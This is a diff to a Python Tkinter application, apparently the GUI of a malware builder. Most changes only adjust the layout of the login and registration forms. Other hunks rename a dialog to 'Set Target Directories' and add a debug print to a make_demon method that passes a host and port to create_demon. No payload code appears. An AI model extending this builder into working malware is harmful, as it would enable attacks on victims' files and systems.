@@ -158,13 +158,13 @@ class Login(Tk):
         label.image = photo # keep a reference!
         label.grid(row = 0, column = 0, columnspan = 2)
 
-        Label(self, text = 'Username', background = 'white', foreground = 'black', font='Helvetica 12 bold').grid(row = 1, column = 0, sticky = 'w')
+        Label(self, text = 'Username', background = 'white', foreground = 'black', font='Helvetica 12 bold').grid(row = 1, column = 0, columnspan = 2)
         self.a = Entry(self, textvariable = self.options['username'], width = 31)
-        self.a.grid(row = 2, column = 0, columnspan = 2, sticky = 'w')
+        self.a.grid(row = 2, column = 0, columnspan = 2)
         self.a.focus()
 
-        Label(self, text = 'Password', background = 'white', foreground = 'black', font='Helvetica 12 bold').grid(row = 3, column = 0, sticky = 'w')
-        Entry(self, textvariable = self.options['pwd'], show = '*', width = 31).grid(row = 4, column = 0, columnspan = 2, sticky = 'w')
+        Label(self, text = 'Password', background = 'white', foreground = 'black', font='Helvetica 12 bold').grid(row = 3, column = 0, columnspan = 2)
+        Entry(self, textvariable = self.options['pwd'], show = '*', width = 31).grid(row = 4, column = 0, columnspan = 2)
 
         login_clk = Button(self, text = 'Login', command = self.login, width = 35).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')
         register_clk = Button(self, text = 'Register', command = self.register, width = 35).grid(row = 6, column = 0, columnspan = 2, sticky = 'w')
@@ -218,16 +218,16 @@ class Login(Tk):
 
         check = '' # Confirm password variable
 
-        Label(self.reg, text = 'Username', background = 'white').grid(row = 1, column = 0, sticky = 'w')
+        Label(self.reg, text = 'Username', background = 'white').grid(row = 1, column = 0, columnspan = 2)
         self.options['reg_username'] = Entry(self.reg, textvariable = self.options['reg_username'], width = 30)
         self.options['reg_username'].grid(row = 2, column = 0, columnspan = 2)
         self.options['reg_username'].focus()
 
-        Label(self.reg, text = 'Password', background = 'white').grid(row = 3, column = 0, sticky = 'w')
+        Label(self.reg, text = 'Password', background = 'white').grid(row = 3, column = 0, columnspan = 2)
         self.options['reg_password'] = Entry(self.reg, textvariable = self.options['reg_password'], width = 30, show = '*')
         self.options['reg_password'].grid(row = 4, column = 0, columnspan = 2)
 
-        Label(self.reg, text = 'Confirm Password', background = 'white').grid(row = 5, column = 0, sticky = 'w')
+        Label(self.reg, text = 'Confirm Password', background = 'white').grid(row = 5, column = 0, columnspan = 2)
         self.options['reg_check_password'] = Entry(self.reg, textvariable = self.options['reg_check_password'], width = 30, show = '*')
         self.options['reg_check_password'].grid(row = 6, column = 0, columnspan = 2)
 
@@ -989,7 +989,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
     def set_dirs(self):
         self.dirs = Toplevel()
-        self.dirs.title(string = 'Set File Extentions')
+        self.dirs.title(string = 'Set Target Directories')
         self.dirs.configure(background = 'white')
         self.dirs.resizable(0,0)
 
@@ -1020,6 +1020,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             #messagebox.showwarning('Disabled', 'Fullscreen is available for GUI mode only, this option have been disabled!')
 
     def make_demon(self):
+
+        print(self.options['working_dir'].get())
         try:
             create_demon(self.options['host'].get(),
                 self.options['port'].get(),
